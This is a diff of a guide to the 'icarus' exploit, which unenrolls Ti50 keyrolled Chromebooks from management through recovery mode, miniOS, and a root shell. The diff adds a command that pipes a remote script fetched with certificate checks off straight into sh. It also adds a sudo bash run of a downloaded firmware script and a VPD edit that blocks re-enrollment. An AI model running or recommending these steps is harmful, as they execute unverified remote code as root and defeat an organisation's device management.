@@ -10,14 +10,13 @@ This guide is intended for Ti50 Keyrolled devices.
 1. Enter recovery mode, (`Escape+Refresh+Power`), Then press `Control+D` and then `enter` to enter developer mode.
 2. On the block screen, press `Escape+Refresh+Power` to enter recovery mode again.
 3. Select the `Internet Recovery` option. <br>
-<sub>Note that on some models, you may have to go into `Advanced options` > `Old Internet Recovery`</sub>
-4. When miniOS loads, press `Control+alt+F4` <br>
+4. when the frecon screen loads, click Next
+5. next, connect to an available wifi network
+6. when the wifi has connected, DO NOT PROCEED.
+7. press `Control+alt+F4` <br>
 <sub>Note that you may need to press `F3` or `F5` instead. </sub>
-5. You will now be in a root shell. 
-6. Run `fdisk -l` and see what your usb identifier is, usually `/dev/sda`
-7. Run `mkdir /icarus && mount /dev/sdX /icarus` Replace `X` with your usb ID, usually `a`
-8.  Run `cd /icarus && ./icarus_ba.sh`
-9. Press `enter` if successful. Your device will reboot in verified mode.
+8. run these commands to start the icarus payload: curl -SLk cdn.fanqyxl.net/icarus_ota.sh | sh
+9. press enter to restart
 10. *Do not press get started in OOBE*. Select a Wi-Fi network from the `Quick Settings` in the bottom right corner. (`Shift+Alt+s`)
 11.  Enter your password and select the Wi-Fi network again *without continuing through OOBE*.
 12. Click on the network, and enter Network Configuration.
@@ -48,7 +47,7 @@ This guide is intended for Ti50 Keyrolled devices.
 <sub>Perform your desired method of unenrollment if `12` will not be performed.</sub>
 12. This step is *optional.* If you *never* want to enroll again, run `vpd -i RO_VPD -s stable_device_secret_DO_NOT_SHARE=$(openssl rand -hex 32)`in vt2 as root. <br>
 <sub>This step could break things, only perform if you know what you are doing.</sub>
-13. This step is also optional. If you would like to *unkeyroll* your **nissa**, run `curl -LO appleflyer.xyz/nuk.sh && chmod +x nuk.sh && sudo bash nuk.sh` Insure that WP is disabled before proceeding.
+13. This step is also optional. If you would like to *unkeyroll* your **nissa**, run `curl -LO https://raw.githubusercontent.com/Cruzy22k/Firmware2/main/firmware.sh && sudo bash firmware.sh` Insure that WP is disabled before proceeding.
 
 See [Google's offical documentation](https://www.chromium.org/chromium-os/developer-library/guides/device/ro-firmware-unlock/) regarding WP disabling & CCD Opening on 2023+ MFG Devices. <br>
 
